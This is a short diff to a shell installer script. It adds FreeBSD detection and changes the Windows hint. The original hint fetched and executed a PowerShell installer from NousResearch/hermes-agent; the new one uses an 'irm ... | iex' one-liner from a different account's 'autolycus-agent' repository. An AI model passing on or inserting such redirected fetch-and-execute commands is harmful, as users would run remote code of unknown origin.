@@ -315,6 +315,10 @@ get_hermes_command_path() {
 
 detect_os() {
     case "$(uname -s)" in
+        FreeBSD*)
+            OS="freebsd"
+            DISTRO="freebsd"
+            ;;
         Linux*)
             if is_termux; then
                 OS="android"
@@ -337,7 +341,7 @@ detect_os() {
             OS="windows"
             DISTRO="windows"
             log_error "Windows detected. Please use the PowerShell installer:"
-            log_info "  irm https://raw.githubusercontent.com/NousResearch/hermes-agent/main/scripts/install.ps1 | iex"
+            log_info "  irm https://raw.githubusercontent.com/waym0reom3ga/autolycus-agent/main/scripts/install.ps1 | iex"
             exit 1
             ;;
         *)
